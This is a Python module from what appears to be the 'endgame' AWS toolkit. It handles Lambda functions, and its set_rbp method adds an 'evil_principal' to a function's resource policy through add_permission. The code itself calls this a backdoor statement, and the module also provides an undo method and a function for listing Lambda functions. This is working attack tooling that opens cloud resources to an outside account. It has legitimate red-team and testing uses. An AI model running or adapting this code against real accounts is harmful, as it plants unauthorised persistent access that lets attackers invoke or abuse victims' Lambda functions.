import json
import logging
from abc import ABC
import boto3
import botocore
from botocore.exceptions import ClientError
from endgame.shared import constants
from endgame.exposure_via_resource_policies.common import ResourceType, ResourceTypes
from endgame.shared.policy_document import PolicyDocument
from endgame.shared.response_message import ResponseMessage
from endgame.shared.utils import get_sid_names_with_error_handling
from endgame.shared.list_resources_response import ListResourcesResponse

logger = logging.getLogger(__name__)


class LambdaFunction(ResourceType, ABC):
    def __init__(self, name: str, region: str, client: boto3.Session.client, current_account_id: str):
        service = "lambda"
        resource_type = "function"
        super().__init__(name, resource_type, service, region, client, current_account_id)

    @property
    def arn(self) -> str:
        return f"arn:aws:{self.service}:{self.region}:{self.current_account_id}:{self.resource_type}:{self.name}"

    def _get_rbp(self) -> PolicyDocument:
        """Get the resource based policy for this resource and store it"""
        # When there is no policy, let's return an empty policy to avoid breaking things
        policy = constants.get_empty_policy()
        try:
            response = self.client.get_policy(FunctionName=self.name)
            policy = json.loads(response.get("Policy"))
        except self.client.exceptions.ResourceNotFoundException as error:
            logger.debug("The Policy does not exist. We will have to add it.")
        except botocore.exceptions.ClientError as error:
            logger.critical(error)
        policy_document = PolicyDocument(
            policy=policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        return policy_document

    def set_rbp(self, evil_policy: dict) -> dict:
        new_policy_document = PolicyDocument(
            policy=evil_policy,
            service=self.service,
            override_action=self.override_action,
            include_resource_block=self.include_resource_block,
            override_resource_block=self.override_resource_block,
            override_account_id_instead_of_principal=self.override_account_id_instead_of_principal,
        )
        new_policy_json = {
            "Version": "2012-10-17",
            "Statement": []
        }
        current_sids = get_sid_names_with_error_handling(self.original_policy)
        for statement in new_policy_document.statements:
            if statement.sid not in current_sids:
                self.client.add_permission(
                    FunctionName=self.name,
                    StatementId=statement.sid,
                    Action=statement.actions[0],
                    Principal=statement.aws_principals[0],
                )
            new_policy_json["Statement"].append(json.loads(statement.__str__()))
        policy_document = self._get_rbp()
        return policy_document.json

    def undo(self, evil_principal: str, dry_run: bool = False) -> ResponseMessage:
        """Wraps client.remove_permission"""
        new_policy = constants.get_empty_policy()
        operation = "UNDO"
        message = "404: No backdoor statement found"
        for statement in self.policy_document.statements:
            if statement.sid == constants.SID_SIGNATURE:
                if not dry_run:
                    self.client.remove_permission(
                        FunctionName=self.name,
                        StatementId=statement.sid,
                    )
                    message = f"200: Removed backdoor statement from the resource policy attached to {self.arn}"
                    break
            else:
                new_policy["Statement"].append(json.loads(statement.__str__()))
        response_message = ResponseMessage(message=message, operation=operation, evil_principal=evil_principal,
                                           victim_resource_arn=self.arn, original_policy=self.original_policy,
                                           updated_policy=new_policy, resource_type=self.resource_type, resource_name=self.name)
        return response_message


class LambdaFunctions(ResourceTypes):
    def __init__(self, client: boto3.Session.client, current_account_id: str, region: str):
        super().__init__(client, current_account_id, region)
        self.service = "lambda"
        self.resource_type = "function"

    @property
    def resources(self) -> list[ListResourcesResponse]:
        """Get a list of these resources"""
        resources = []

        paginator = self.client.get_paginator('list_functions')
        page_iterator = paginator.paginate()
        for page in page_iterator:
            functions = page["Functions"]
            for function in functions:
                name = function.get("FunctionName")
                arn = function.get("FunctionArn")
                list_resources_response = ListResourcesResponse(
                    service=self.service, account_id=self.current_account_id, arn=arn, region=self.region,
                    resource_type=self.resource_type, name=name)
                resources.append(list_resources_response)
        return resources
